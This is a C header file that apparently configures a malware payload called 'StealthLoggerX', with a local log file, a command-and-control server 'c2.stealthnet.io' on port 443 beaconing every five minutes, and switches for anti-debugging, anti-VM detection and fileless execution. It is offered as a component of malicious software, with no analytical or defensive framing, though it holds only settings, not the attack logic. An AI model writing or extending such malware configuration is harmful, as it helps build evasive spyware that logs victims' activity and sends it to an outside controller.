#ifndef PAYLOAD_CONFIG_H
#define PAYLOAD_CONFIG_H

// Payload Configuration
#define PAYLOAD_VERSION "1.2.0"
#define PAYLOAD_NAME "StealthLoggerX"
#define MAX_LOG_SIZE 1024 * 1024  // 1MB
#define LOG_FILE "system.log"

// C2 Configuration
#define C2_SERVER "c2.stealthnet.io"
#define C2_PORT 443
#define C2_INTERVAL 300  // 5 minutes

// Evasion Configuration
#define ENABLE_ANTI_DEBUG true
#define ENABLE_ANTI_VM true
#define ENABLE_FILELESS_EXECUTION true

#endif // PAYLOAD_CONFIG_H